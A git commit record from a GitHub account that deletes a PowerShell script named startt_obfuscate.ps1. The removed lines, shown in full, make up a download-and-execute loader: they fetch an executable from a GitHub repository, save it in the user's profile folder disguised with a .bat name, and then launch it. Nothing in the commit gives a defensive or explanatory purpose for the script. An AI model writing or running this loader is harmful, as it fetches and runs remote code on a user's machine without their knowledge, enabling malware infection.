fd77a8332bc605c2828b001de7b9430d4977672e
n0t_cr1m3 <102881313+n0t-cr1m3@users.noreply.github.com>
2024-01-03 22:32:10 +0100

    Delete startt_obfuscate.ps1

--- startt_obfuscate.ps1
+++
@@ -1,3 +0,0 @@
-Start-BitsTransfer -Priority foreground -Source "https://github.com/n0t-cr1m3/test/raw/main/startt1.exe" -Destination "$env:USERPROFILE/startt.bat"
-Start-Process -FilePath "$env:USERPROFILE/startt.bat"
-            
